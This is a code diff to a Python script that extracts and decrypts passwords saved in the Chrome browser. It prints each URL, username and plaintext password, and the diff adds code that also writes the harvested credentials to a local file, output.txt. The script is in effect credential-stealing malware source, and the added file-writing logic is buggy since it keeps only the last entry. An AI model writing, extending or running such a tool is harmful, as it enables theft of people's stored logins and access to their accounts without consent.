@@ -91,6 +91,7 @@ def fetch_passwords(browser_name):
         username = row[1]
         encrypted_password = row[2]
         decrypted_password = decrypt_password(encrypted_password, encryption_key)
+        aaa=f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n"
         print(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")
 
     cursor.close()
@@ -98,7 +99,18 @@ def fetch_passwords(browser_name):
 
     # Remove the temporary database copy after use
     os.remove(temp_db_path)
-
+# Define a variable with some text data
+    output_data =aaa
+    
+    # Define the file path
+    file_path = "output.txt"
+    
+    # Open the file in write mode and save the data
+    with open(file_path, "w", encoding="utf-8") as file:
+        file.write(output_data)
+    
+    print(f"✅ Data saved to {file_path}")
 if __name__ == "__main__":
     browser_name = 'Chrome'
     fetch_passwords(browser_name)
+    
